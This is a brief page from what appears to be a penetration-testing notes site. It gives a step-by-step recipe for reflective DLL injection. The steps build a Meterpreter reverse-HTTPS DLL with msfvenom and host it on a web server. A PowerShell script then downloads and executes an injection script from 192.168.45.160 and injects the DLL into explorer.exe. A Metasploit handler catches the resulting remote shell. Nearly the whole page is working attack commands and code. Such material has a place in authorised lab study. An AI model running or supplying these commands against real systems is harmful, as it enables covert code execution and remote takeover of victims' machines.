---
title: Reflective DLL Injection (Memory)
layout: default
parent: Process Injection / Migration / Hollowing
nav_order: 3
---

1. First create the DLL:\
`sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT -f dll -o /var/www/html/met.dll`

2. Ready Apache2:\
`sudo systemctl restart apache2`

3. Put Invoke-ReflectivePEInjection.ps1 into /var/www/html.

4. Use the following script so that it will auto execute (can ignore error):

```
$scriptUrl = "http://192.168.45.160/Invoke-ReflectivePEInjection.ps1"

$scriptContent = (New-Object System.Net.WebClient).DownloadString($scriptUrl)

Invoke-Expression $scriptContent

$bytes = (New-Object System.Net.WebClient).DownloadData("http://192.168.45.160/met.dll")
$procid = (Get-Process -Name explorer).Id

Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

5\. Finally prepare for incoming shell:

```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
exploit
```